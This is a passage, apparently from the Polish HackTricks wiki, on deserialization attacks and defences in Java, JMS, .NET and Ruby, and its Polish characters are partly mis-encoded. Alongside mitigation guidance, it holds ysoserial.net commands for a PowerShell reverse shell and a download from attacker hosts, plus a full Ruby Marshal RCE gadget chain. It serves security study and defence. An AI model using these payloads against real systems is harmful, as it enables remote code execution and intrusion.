* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Dlaczego

Java szeroko wykorzystuje serializacj w r贸偶nych celach, takich jak:

- **呕dania HTTP**: Serializacja jest powszechnie stosowana w zarzdzaniu parametrami, ViewState, cookies itp.
- **RMI (Remote Method Invocation)**: Protok贸 Java RMI, kt贸ry opiera si wycznie na serializacji, jest fundamentem dla komunikacji zdalnej w aplikacjach Java.
- **RMI przez HTTP**: Ta metoda jest powszechnie stosowana przez aplikacje internetowe oparte na grubej warstwie klienta w Javie, wykorzystujc serializacj do komunikacji obiekt贸w.
- **JMX (Java Management Extensions)**: JMX wykorzystuje serializacj do przesyania obiekt贸w przez sie.
- **Niestandardowe protokoy**: W Javie standardow praktyk jest przesyanie surowych obiekt贸w Javy, co zostanie zademonstrowane w kolejnych przykadach wykorzystania.

### Zapobieganie

#### Obiekty tymczasowe

Klasa implementujca `Serializable` mo偶e oznaczy jako `transient` dowolny obiekt wewntrz klasy, kt贸ry nie powinien by serializowany. Na przykad:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Unikaj serializacji klasy, kt贸ra musi implementowa interfejs Serializable

W przypadkach, gdy pewne **obiekty musz implementowa interfejs `Serializable`** ze wzgldu na hierarchi klas, istnieje ryzyko niezamierzonej deserializacji. Aby temu zapobiec, upewnij si, 偶e te obiekty s niemo偶liwe do deserializacji, definiujc metod `final` `readObject()`, kt贸ra zawsze zgasza wyjtek, jak pokazano poni偶ej:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Wzmacnianie bezpieczestwa deserializacji w Javie**

**Dostosowywanie `java.io.ObjectInputStream`** to praktyczne podejcie do zabezpieczania proces贸w deserializacji. Metoda ta jest odpowiednia, gdy:

- Kod deserializacji jest pod Twoj kontrol.
- Znane s klasy oczekiwane do deserializacji.

Nadpisz metod **`resolveClass()`** w celu ograniczenia deserializacji tylko do dozwolonych klas. Zapobiega to deserializacji dowolnej klasy, z wyjtkiem tych, kt贸re s wyra藕nie dozwolone, jak w poni偶szym przykadzie, kt贸ry ogranicza deserializacj tylko do klasy `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**U偶ywanie agenta Java do poprawy bezpieczestwa** oferuje rozwizanie awaryjne, gdy nie jest mo偶liwa modyfikacja kodu. Ta metoda dotyczy g贸wnie **czarnolistowania szkodliwych klas**, przy u偶yciu parametru JVM:
```
-javaagent:name-of-agent.jar
```
Zapewnia spos贸b na dynamiczne zabezpieczenie deserializacji, idealny dla rodowisk, w kt贸rych natychmiastowe zmiany w kodzie s niemo偶liwe.

Sprawd藕 przykad w [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)


**Wdra偶anie filtr贸w serializacji**: W Javie 9 wprowadzono filtry serializacji za pomoc interfejsu **`ObjectInputFilter`**, zapewniajc pot偶ny mechanizm okrelania kryteri贸w, kt贸re musz spenia obiekty serializowane przed deserializacj. Filtry te mog by stosowane globalnie lub dla ka偶dego strumienia, oferujc precyzyjn kontrol nad procesem deserializacji.

Aby skorzysta z filtr贸w serializacji, mo偶na ustawi globalny filtr, kt贸ry bdzie stosowany do wszystkich operacji deserializacji, lub skonfigurowa go dynamicznie dla konkretnych strumieni. Na przykad:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Wykorzystywanie zewntrznych bibliotek dla zwikszenia bezpieczestwa**: Biblioteki takie jak **NotSoSerial**, **jdeserialize** i **Kryo** oferuj zaawansowane funkcje do kontroli i monitorowania deserializacji w jzyku Java. Te biblioteki mog zapewni dodatkowe warstwy bezpieczestwa, takie jak tworzenie listy dozwolonych lub niedozwolonych klas, analizowanie obiekt贸w zserializowanych przed deserializacj oraz implementowanie niestandardowych strategii serializacji.

- **NotSoSerial** przechwytuje procesy deserializacji w celu zapobiegania wykonaniu niezaufanego kodu.
- **jdeserialize** umo偶liwia analiz obiekt贸w zserializowanych w jzyku Java bez ich deserializacji, co pomaga w identyfikacji potencjalnie zoliwej zawartoci.
- **Kryo** to alternatywna biblioteka do serializacji, kt贸ra skupia si na szybkoci i wydajnoci, oferujc konfigurowalne strategie serializacji, kt贸re mog zwikszy bezpieczestwo.


### Referencje

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Prezentacja na temat deserializacji i ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Prezentacja na temat gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) oraz slajdy: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Artyku na temat Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Artyku na temat deserializacji JSON w Java i .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacja: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) oraz slajdy: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVE dotyczce deserializacji: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Wstrzykiwanie JNDI i log4Shell

Dowiedz si, czym jest **wstrzykiwanie JNDI, jak go nadu偶ywa za pomoc RMI, CORBA i LDAP oraz jak wykorzysta log4shell** (oraz przykad tej podatnoci) na nastpnej stronie:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) to interfejs programowania aplikacji dla middleware obsugujcego komunikacj midzykomponentow w oparciu o przesyanie komunikat贸w. JMS jest czci platformy Java Enterprise Edition (Java EE) i zosta zdefiniowany przez specyfikacj opracowan przez Sun Microsystems, a nastpnie rozwijan przez Java Community Process. Jest to standard komunikacji, kt贸ry umo偶liwia komponentom aplikacji opartym na Java EE tworzenie, wysyanie, odbieranie i odczytywanie komunikat贸w. Pozwala na komunikacj midzy r贸偶nymi komponentami rozproszonej aplikacji, kt贸ra jest lu藕no powizana, niezawodna i asynchroniczna. (Z [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkty

Istnieje kilka produkt贸w wykorzystujcych ten middleware do wysyania komunikat贸w:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### Eksploatacja

W zasadzie istnieje **wiele usug korzystajcych z JMS w niebezpieczny spos贸b**. Dlatego, jeli masz **wystarczajce uprawnienia** do wysyania wiadomoci do tych usug (zazwyczaj bdziesz potrzebowa prawidowych powiadcze), mo偶esz wysa **zserializowane zoliwe obiekty, kt贸re zostan zdeserializowane przez odbiorc/subskrybenta**.\
Oznacza to, 偶e w tej eksploatacji **wszyscy klienci korzystajcy z tej wiadomoci zostan zainfekowani**.

Nale偶y pamita, 偶e nawet jeli usuga jest podatna (poniewa偶 niebezpiecznie deserializuje dane wejciowe u偶ytkownika), nadal musisz znale藕 odpowiednie gad偶ety, aby wykorzysta podatno.

Narzdzie [JMET](https://github.com/matthiaskaiser/jmet) zostao stworzone do **czenia si i atakowania tych usug, wysyajc wiele zserializowanych zoliwych obiekt贸w za pomoc znanych gad偶et贸w**. Te ataki bd dziaa, jeli usuga nadal jest podatna i jeli kt贸rykolwiek z u偶ytych gad偶et贸w znajduje si w podatnej aplikacji.

### Referencje

* Prezentacja na temat JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slajdy: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

W kontekcie .Net, ataki deserializacyjne dziaaj podobnie jak w przypadku Javy, gdzie wykorzystuje si gad偶ety do uruchamiania okrelonego kodu podczas deserializacji obiektu.
### Odcisk palca

#### WhiteBox

Kod 藕r贸dowy powinien zosta sprawdzony pod ktem wystpie:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Nale偶y skupi si na serializatorach, kt贸re pozwalaj na okrelenie typu za pomoc zmiennej kontrolowanej przez u偶ytkownika.

#### BlackBox

Wyszukiwanie powinno by skierowane na zakodowany cig znak贸w Base64 **AAEAAAD/////** lub dowolny podobny wz贸r, kt贸ry mo偶e by poddany deserializacji po stronie serwera, umo偶liwiajc kontrol nad typem do deserializacji. Mo偶e to obejmowa, ale nie jest ograniczone do, struktur **JSON** lub **XML** zawierajcych `TypeObject` lub `$type`.

### ysoserial.net

W tym przypadku mo偶na u偶y narzdzia [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) w celu **tworzenia atak贸w deserializacji**. Po pobraniu repozytorium git nale偶y **skompilowa narzdzie** za pomoc na przykad Visual Studio.

Jeli chcesz dowiedzie si, **jak ysoserial.net tworzy swoje ataki**, mo偶esz [**sprawdzi t stron, gdzie wyjaniono gad偶et ObjectDataProvider + ExpandedWrapper + formatowanie Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

G贸wne opcje **ysoserial.net** to: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** su偶y do wskazania gad偶etu do wykorzystania (wskazuje klas/funkcj, kt贸ra bdzie wykorzystana podczas deserializacji do wykonania polece).
* **`--formatter`**, su偶y do wskazania metody serializacji ataku (musisz wiedzie, jak bibliotek u偶ywa back-end do deserializacji adunku i u偶y tej samej do jego serializacji).
* **`--output`** su偶y do wskazania, czy chcesz atak w formacie **surowym** lub **kodowanym Base64**. _Nale偶y zauwa偶y, 偶e **ysoserial.net** zakoduje adunek za pomoc **UTF-16LE** (domylnie u偶ywanego kodowania w systemie Windows), wic jeli otrzymasz surowy adunek i zakodujesz go z konsoli Linux, mo偶esz napotka problemy z **kompatybilnoci kodowania**, kt贸re uniemo偶liwi poprawne dziaanie ataku (w przypadku HTB JSON box adunek dziaa zar贸wno w UTF-16LE, jak i ASCII, ale to nie oznacza, 偶e zawsze bdzie dziaa)._
* **`--plugin`** ysoserial.net obsuguje wtyczki do tworzenia **atak贸w dla konkretnych framework贸w**, takich jak ViewState

#### Wicej parametr贸w ysoserial.net

* `--minify` dostarczy **mniejszego adunku** (jeli to mo偶liwe)
* `--raf -f Json.Net -c "anything"` Spowoduje to wskazanie wszystkich gad偶et贸w, kt贸re mo偶na u偶y z podanym formatowaniem (`Json.Net` w tym przypadku)
* `--sf xml` mo偶na **wskaza gad偶et** (`-g`) i ysoserial.net bdzie wyszukiwa formatery zawierajce "xml" (bez rozr贸偶niania wielkoci liter)

**Przykady u偶ycia ysoserial.net** do tworzenia atak贸w:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ma r贸wnie偶 bardzo interesujcy parametr, kt贸ry pomaga lepiej zrozumie, jak dziaa ka偶dy exploit: `--test`\
Jeli podasz ten parametr, **ysoserial.net** spr贸buje uruchomi exploit lokalnie, dziki czemu mo偶esz przetestowa, czy twoje payloady dziaaj poprawnie.\
Ten parametr jest pomocny, poniewa偶 w kodzie znajdziesz fragmenty kodu takie jak ten (z [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
To oznacza, 偶e w celu przetestowania exploitu kod wywoa [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
W **poprzednim kodzie wystpuje podatno na stworzenie exploitu**. Jeli wic znajdziesz co podobnego w aplikacji .Net, oznacza to prawdopodobnie, 偶e ta aplikacja r贸wnie偶 jest podatna.\
Dlatego parametr **`--test`** pozwala nam zrozumie, **kt贸re fragmenty kodu s podatne** na exploit deserializacji, kt贸ry mo偶e stworzy **ysoserial.net**.

### ViewState

Zajrzyj do [tego POSTA na temat **jak pr贸bowa wykorzysta parametr \_\_ViewState w .Net**](exploiting-\_\_viewstate-parameter.md) aby **wykona dowolny kod**. Jeli **ju偶 znasz sekrety** u偶ywane przez maszyn ofiary, [**przeczytaj ten post, aby dowiedzie si, jak wykona kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Zapobieganie

Aby zmniejszy ryzyko zwizane z deserializacj w .Net:

- **Unikaj pozwalania strumieniom danych na definiowanie typ贸w obiekt贸w**. Korzystaj z `DataContractSerializer` lub `XmlSerializer`, gdy to mo偶liwe.

- **Dla `JSON.Net`, ustaw `TypeNameHandling` na `None`:**
%%%TypeNameHandling = TypeNameHandling.None%%%

- **Unikaj korzystania z `JavaScriptSerializer` z `JavaScriptTypeResolver`.**

- **Ogranicz typy, kt贸re mog by deserializowane**, rozumiejc inherentne ryzyko zwizane z typami .Net, takimi jak `System.IO.FileInfo`, kt贸re mog modyfikowa waciwoci plik贸w serwera, co potencjalnie prowadzi do atak贸w typu odmowa usugi.

- **Bd藕 ostro偶ny w przypadku typ贸w posiadajcych ryzykowne waciwoci**, takich jak `System.ComponentModel.DataAnnotations.ValidationException` z jego waciwoci `Value`, kt贸ra mo偶e by wykorzystana.

- **Bezpiecznie kontroluj instancjonowanie typ贸w**, aby zapobiec wpywaniu atakujcych na proces deserializacji, co sprawia, 偶e nawet `DataContractSerializer` lub `XmlSerializer` s podatne.

- **Wprowad藕 kontrol na biaej licie**, korzystajc z niestandardowego `SerializationBinder` dla `BinaryFormatter` i `JSON.Net`.

- **Bd藕 na bie偶co z znanymi niebezpiecznymi gad偶etami deserializacji** w .Net i upewnij si, 偶e deserializatory nie instancjonuj takich typ贸w.

- **Izoluj potencjalnie ryzykowny kod** od kodu z dostpem do internetu, aby unikn ujawnienia znanych gad偶et贸w, takich jak `System.Windows.Data.ObjectDataProvider` w aplikacjach WPF, dla niezaufanych 藕r贸de danych.

### **Odnoniki**

* Dokument na temat deserializacji JSON w Java i .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacja: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdy: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

W Ruby serializacja jest uatwiona przez dwie metody w bibliotece **marshal**. Pierwsza metoda, znana jako **dump**, su偶y do przeksztacenia obiektu w strumie bajt贸w. Ten proces nazywany jest serializacj. Z kolei druga metoda, **load**, su偶y do przywr贸cenia strumienia bajt贸w do obiektu, proces ten nazywany jest deserializacj.

W celu zabezpieczenia obiekt贸w zserializowanych, **Ruby u偶ywa HMAC (Hash-Based Message Authentication Code)**, zapewniajc integralno i autentyczno danych. Klucz u偶ywany w tym celu jest przechowywany w jednym z kilku mo偶liwych miejsc:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X og贸lna deserializacja do RCE gadget chain (wicej informacji na stronie [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/))**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Inne acuchy RCE do wykorzystania w Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia dla HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
